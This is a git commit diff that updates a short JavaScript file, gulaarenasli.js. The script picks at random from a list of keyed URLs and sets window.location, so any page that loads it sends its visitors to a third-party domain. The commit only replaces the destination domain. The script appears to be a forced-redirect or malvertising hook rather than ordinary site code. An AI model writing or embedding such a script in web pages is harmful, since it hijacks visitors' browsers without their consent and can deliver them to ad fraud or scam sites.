ab7db0c6e33902a32f9a4652fe39a04a64bef18c
Armankhan24 <84512758+Armankhan24@users.noreply.github.com>
2021-06-02 18:10:53 +0700

    Update gulaarenasli.js

--- gulaarenasli.js
+++ gulaarenasli.js
@@ -1,6 +1,6 @@
 var dataUrl = [
-  '//limelightcopper.com/mwq4su0t?key=35a6f3c9cc4b4ad4de4d95065170e1ec',
-  '//limelightcopper.com/psxtrb0ac?key=26b36460ba330937e712e871b14c6d05'
+  '//adorableold.com/mwq4su0t?key=35a6f3c9cc4b4ad4de4d95065170e1ec',
+  '//adorableold.com/psxtrb0ac?key=26b36460ba330937e712e871b14c6d05'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
